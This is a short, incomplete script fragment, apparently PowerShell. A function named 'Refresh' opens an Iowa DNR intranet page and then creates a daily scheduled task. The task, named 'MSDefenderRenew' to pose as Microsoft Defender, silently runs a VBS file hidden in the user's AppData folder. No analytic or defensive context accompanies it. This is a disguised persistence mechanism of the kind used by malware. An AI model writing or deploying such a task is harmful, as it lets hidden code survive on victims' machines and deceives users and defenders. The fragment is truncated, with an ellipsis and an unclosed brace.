Function Refresh
{
start https://intranet.iowadnr.gov/
...
schtasks /create  /TN MSDefenderRenew /TR 'C:\Windows\System32\WScript.exe //Nologo //B %UserProfile%\AppData\Local\Microsoft\Windows\Explorer\Initialize.vbs' /SC DAILY /ST 09:30:00
